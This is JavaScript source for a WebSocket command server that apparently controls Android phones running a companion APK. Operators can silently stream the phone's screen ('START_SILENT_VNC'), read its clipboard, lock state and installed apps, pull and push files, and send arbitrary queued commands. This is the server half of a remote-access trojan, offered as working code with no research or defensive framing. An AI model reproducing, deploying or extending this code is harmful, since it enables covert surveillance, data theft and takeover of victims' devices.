'use strict';
const WebSocket  = require('ws');
const { v4: uuid } = require('uuid');
const db = require('./db');
const { decodeApkFrame, encodeServerFrame, makeDevIdBuf } = require('./protocol');

// ── Live connection maps ───────────────────────────────────────────────────────
const devices   = new Map();  // devId  → { ws, devIdBuf, model, sdk, ... }
const operators = new Map();  // opId   → ws
const vncSubs   = new Map();  // devId  → Set<opWs>  — VNC stream subscribers

// File transfer state (server-side assembly for browser→device uploads)
const fileTransfers = new Map(); // transferId → { chunks: Map, total, destPath, devId }

// ── Helpers ────────────────────────────────────────────────────────────────────
const tryJSON  = (s, fb = null) => { try { return JSON.parse(s); } catch { return fb; } };
const sendJson = (ws, o) => {
  if (ws && ws.readyState === WebSocket.OPEN)
    try { ws.send(JSON.stringify(o)); } catch {}
};
const broadcast = (obj) => {
  const msg = JSON.stringify(obj);
  for (const ws of operators.values())
    if (ws.readyState === WebSocket.OPEN)
      try { ws.send(msg); } catch {}
};

// ── VNC frame forwarding ──────────────────────────────────────────────────────
function forwardVncFrame(devId, apkFrame) {
  const subs = vncSubs.get(devId);
  if (!subs || !subs.size) return;
  const dev    = devices.get(devId);
  if (!dev) return;
  const serverFrame = encodeServerFrame(dev.devIdBuf, apkFrame);
  for (const ws of subs)
    if (ws.readyState === WebSocket.OPEN)
      try { ws.send(serverFrame); } catch {}
}

// ── Device message handler ────────────────────────────────────────────────────
async function handleDeviceMessage(devId, rawData) {
  // Binary frame (VNC)
  if (Buffer.isBuffer(rawData)) {
    const frame = decodeApkFrame(rawData);
    if (frame) forwardVncFrame(devId, frame);
    return;
  }

  const msg  = tryJSON(rawData);
  if (!msg) return;
  const type = msg.type || msg.action || '';

  switch (type) {
    // ── Registration ─────────────────────────────────────────────────────────
    case 'register': {
      db.upsertDevice(devId, msg);
      const dev = devices.get(devId);
      if (dev) {
        dev.model   = msg.model  || '';
        dev.sdk     = msg.sdk    || 0;
        dev.screenW = msg.screenW || 0;
        dev.screenH = msg.screenH || 0;
        dev.vncV1   = !!msg.vncV1;
      }
      // Flush queued commands
      const queued = db.flushQueue(devId);
      const devWs  = devices.get(devId)?.ws;
      for (const q of queued) {
        if (devWs?.readyState === WebSocket.OPEN)
          sendJson(devWs, { action: q.cmd, type: q.cmd, ...q.args });
      }
      broadcast({ type: 'device_online', id: devId,
                  model: msg.model, sdk: msg.sdk,
                  screenW: msg.screenW, screenH: msg.screenH });
      break;
    }

    // ── VNC frame (JSON/base64 fallback — usually binary path is used) ────────
    case 'vnc_frame':
    case 'vnc_v2_frame':
    case 'screen_frame': {
      // base64 fallback: convert to fake binary frame and forward
      const b64 = msg.data || msg.image || '';
      if (b64.length > 0) {
        const jpeg  = Buffer.from(b64, 'base64');
        const ftype = type === 'vnc_v2_frame' ? 0x02 : 0x01;
        forwardVncFrame(devId, {
          type: ftype, seq: 0, quality: msg.quality || 50,
          tsMs: Date.now(), jpeg
        });
      }
      break;
    }

    // ── Ly hierarchy ──────────────────────────────────────────────────────────
    case 'screen_hierarchy': {
      broadcast({ type: 'screen_hierarchy', id: devId, data: msg.data });
      break;
    }

    // ── App list ──────────────────────────────────────────────────────────────
    case 'installed_apps': {
      db.run(`INSERT INTO app_listings(dev_id,data) VALUES(?,?)`,
             [devId, JSON.stringify(msg)]);
      broadcast({ type: 'installed_apps', id: devId, data: msg });
      break;
    }

    // ── File list ─────────────────────────────────────────────────────────────
    case 'file_list': {
      broadcast({ type: 'file_list', id: devId, path: msg.path, data: msg });
      break;
    }

    // ── File chunk (device → server → browser) ────────────────────────────────
    case 'file_chunk': {
      broadcast({ type: 'file_chunk', id: devId,
                  transferId: msg.transferId, chunkIdx: msg.chunkIdx,
                  totalChunks: msg.totalChunks, data: msg.data,
                  done: msg.done });
      break;
    }

    // ── Lock status ───────────────────────────────────────────────────────────
    case 'lock_status': {
      broadcast({ type: 'lock_status', id: devId,
                  locked: msg.locked, secure: msg.secure,
                  screenOn: msg.screenOn, lockType: msg.type });
      break;
    }

    // ── Cmd ack ───────────────────────────────────────────────────────────────
    case 'cmd_result': {
      broadcast({ type: 'cmd_result', id: devId,
                  cmd: msg.cmd, success: msg.success, msg: msg.msg,
                  pkg: msg.pkg, path: msg.path });
      db.logEvent(devId, 'cmd_result', msg);
      break;
    }

    // ── Device info ───────────────────────────────────────────────────────────
    case 'device_info': {
      db.upsertDevice(devId, msg);
      broadcast({ type: 'device_info', id: devId, data: msg });
      break;
    }

    // ── Clipboard ─────────────────────────────────────────────────────────────
    case 'clipboard': {
      broadcast({ type: 'clipboard', id: devId, text: msg.text });
      break;
    }

    // ── Secure window ─────────────────────────────────────────────────────────
    case 'secure_window': {
      broadcast({ type: 'secure_window', id: devId, secure: msg.secure });
      break;
    }

    // ── Upload done ───────────────────────────────────────────────────────────
    case 'file_upload_done': {
      broadcast({ type: 'file_upload_done', id: devId,
                  transferId: msg.transferId, success: msg.success });
      break;
    }
  }
}

// ── Operator message handler ───────────────────────────────────────────────────
function handleOperatorMessage(opId, opWs, rawData) {
  const msg  = tryJSON(rawData);
  if (!msg)  return;
  const type = msg.type || '';

  switch (type) {
    // ── VNC subscribe ─────────────────────────────────────────────────────────
    case 'vnc_subscribe': {
      const id = msg.devId;
      if (!vncSubs.has(id)) vncSubs.set(id, new Set());
      vncSubs.get(id).add(opWs);

      const dev = devices.get(id);
      if (dev) {
        // Tell device to start VNC
        sendJson(dev.ws, {
          action: 'START_SILENT_VNC', type: 'START_SILENT_VNC',
          fps: msg.fps || 20, quality: msg.quality || 50
        });
      } else {
        db.enqueueCmd(id, 'START_SILENT_VNC', { fps: 20, quality: 50 });
      }
      break;
    }

    case 'vnc_unsubscribe': {
      const id  = msg.devId;
      const sub = vncSubs.get(id);
      if (sub) { sub.delete(opWs); if (!sub.size) vncSubs.delete(id); }
      const dev = devices.get(id);
      if (dev) sendJson(dev.ws, { action: 'STOP_SILENT_VNC', type: 'STOP_SILENT_VNC' });
      break;
    }

    // ── Hierarchy subscribe ───────────────────────────────────────────────────
    case 'hierarchy_subscribe': {
      const dev = devices.get(msg.devId);
      if (dev) sendJson(dev.ws, { action: 'REQUEST_HIERARCHY',
                                   type:   'REQUEST_HIERARCHY' });
      break;
    }

    // ── Generic command forward ────────────────────────────────────────────────
    case 'cmd': {
      const devId = msg.devId;
      const cmd   = msg.cmd;
      if (!cmd) return;
      const dev   = devices.get(devId);
      const payload = { action: cmd, type: cmd, ...msg.args };
      if (dev) {
        sendJson(dev.ws, payload);
      } else {
        db.enqueueCmd(devId, cmd, msg.args || {});
      }
      break;
    }

    // ── File upload init (browser → server → device) ──────────────────────────
    case 'upload_init': {
      const devId = msg.devId;
      fileTransfers.set(msg.transferId, {
        chunks: new Map(), total: msg.totalChunks,
        destPath: msg.destPath, devId
      });
      const dev = devices.get(devId);
      if (dev) sendJson(dev.ws, {
        action: 'UPLOAD_FILE_INIT', type: 'UPLOAD_FILE_INIT',
        transferId: msg.transferId, totalChunks: msg.totalChunks,
        destPath: msg.destPath
      });
      break;
    }

    case 'upload_chunk': {
      const t = fileTransfers.get(msg.transferId);
      if (!t) return;
      const dev = devices.get(t.devId);
      if (dev) sendJson(dev.ws, {
        action: 'UPLOAD_FILE_CHUNK', type: 'UPLOAD_FILE_CHUNK',
        transferId: msg.transferId, chunkIdx: msg.chunkIdx,
        data: msg.data, destPath: t.destPath
      });
      break;
    }

    // ── Devices list ──────────────────────────────────────────────────────────
    case 'list_devices': {
      const devList = db.all(`SELECT * FROM devices ORDER BY last_seen DESC`);
      const online  = [...devices.keys()];
      sendJson(opWs, { type: 'devices_list', devices: devList, online });
      break;
    }
  }
}

// ── Hub initialiser ────────────────────────────────────────────────────────────
function init(server) {
  const wss = new WebSocket.Server({ server, path: '/ws' });

  wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'ws://x');
    const role = url.searchParams.get('role') || 'device';
    const devId = url.searchParams.get('id')  || uuid();

    if (role === 'device') {
      // ── Device connection ──────────────────────────────────────────────────
      const devIdBuf = makeDevIdBuf(devId);
      devices.set(devId, { ws, devIdBuf });
      db.touchDevice(devId);
      broadcast({ type: 'device_online', id: devId });

      ws.on('message', (data, isBinary) => {
        if (isBinary) {
          handleDeviceMessage(devId, data);
        } else {
          handleDeviceMessage(devId, data.toString());
        }
      });

      ws.on('close', () => {
        devices.delete(devId);
        // Keep VNC subs — operator stays subscribed, waiting for reconnect
        broadcast({ type: 'device_offline', id: devId });
      });

    } else {
      // ── Operator connection ───────────────────────────────────────────────
      const opId = uuid();
      operators.set(opId, ws);

      // Send current device list on connect
      const devList = db.all(`SELECT * FROM devices ORDER BY last_seen DESC`);
      const online  = [...devices.keys()];
      sendJson(ws, { type: 'devices_list', devices: devList, online });

      ws.on('message', (data) => {
        handleOperatorMessage(opId, ws, data.toString());
      });

      ws.on('close', () => {
        operators.delete(opId);
        // Remove from VNC subs
        for (const [devId, subs] of vncSubs) {
          subs.delete(ws);
          if (!subs.size) vncSubs.delete(devId);
        }
      });
    }
  });

  return wss;
}

module.exports = { init, devices, operators };
